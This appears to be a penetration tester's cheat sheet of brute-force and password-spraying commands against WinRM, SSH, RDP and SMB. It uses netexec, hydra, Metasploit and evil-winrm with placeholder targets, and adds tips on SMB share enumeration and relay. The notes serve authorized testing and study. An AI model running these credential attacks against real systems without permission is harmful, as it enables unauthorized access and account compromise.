# Network Services — Brute Force

## WinRM

Spray with netexec — `(Pwn3d!)` = can exec commands:

```bash
netexec winrm <TARGET> -u <USERLIST> -p <WORDLIST>
```

Connect once you have creds:

```bash
evil-winrm -i <TARGET> -u <USER> -p <PASS>
```

## SSH

```bash
hydra -L <USERLIST> -P <WORDLIST> ssh://<TARGET> -t 4
ssh <USER>@<TARGET>
```

## RDP

RDP doesn't like parallel connections — keep threads low:

```bash
hydra -L <USERLIST> -P <WORDLIST> rdp://<TARGET> -t 4 -W 3
xfreerdp /v:<TARGET> /u:<USER> /p:<PASS>
```

## SMB

Hydra first, fall back to MSF if you get `invalid reply` (SMBv3 issue):

```bash
hydra -L <USERLIST> -P <WORDLIST> smb://<TARGET>
```

MSF fallback:

```bash
use auxiliary/scanner/smb/smb_login
set USER_FILE <USERLIST>
set PASS_FILE <WORDLIST>
set RHOSTS <TARGET>
run
```

Enum shares with valid creds — check signing:False for relay:

```bash
netexec smb <TARGET> -u <USER> -p <PASS> --shares
smbclient -U <USER> \\\\<TARGET>\\<SHARE>
```

> [!tip] netexec supports all protocols: `netexec <proto> <TARGET> -u <USER> -p <PASS>` — same syntax across winrm, smb, ssh, rdp, mssql, ldap, vnc